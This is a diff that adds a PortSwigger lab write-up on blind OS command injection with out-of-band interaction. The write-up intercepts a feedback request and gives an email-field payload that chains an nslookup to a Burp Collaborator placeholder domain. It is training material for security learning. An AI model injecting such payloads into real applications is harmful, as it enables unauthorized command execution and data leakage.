@@ -72,3 +72,25 @@ We will redirect the output to a example file by using command
 ![3rdlab4](https://github.com/tousif13/Port_Swigger_Labs/assets/33444140/a341e796-b6f7-49c2-a639-527fab69c0e2)
 
 ![3rdlab5](https://github.com/tousif13/Port_Swigger_Labs/assets/33444140/1722c173-2af3-4f76-a771-b5c0f84d3d26)
+
+## Lab 4: Blind OS command injection with out-of-band interaction
+
+This lab contains a blind OS command injection vulnerability in the feedback function.
+
+The application executes a shell command containing the user-supplied details. The command is executed asynchronously and has no effect on the application's response. It is not possible to redirect output into a location that you can access. However, you can trigger out-of-band interactions with an external domain.
+
+To solve the lab, exploit the blind OS command injection vulnerability to issue a DNS lookup to Burp Collaborator.
+
+### Sol :
+
+* Use Burp Suite to intercept and modify the request that submits feedback.
+
+![image](https://github.com/tousif13/Port_Swigger_Labs/assets/33444140/122d8b1c-416f-4bf7-a54c-3deb765023da)
+
+* Modify the `email` parameter, changing it to below payload by giving your own burp collaborator domain
+
+      email=x||nslookup+x.BURP-COLLABORATOR-SUBDOMAIN||
+
+![image](https://github.com/tousif13/Port_Swigger_Labs/assets/33444140/4e958d39-fa2e-4126-99ca-4b9e5a5980f4)
+
+* Thus, the lab is solved.
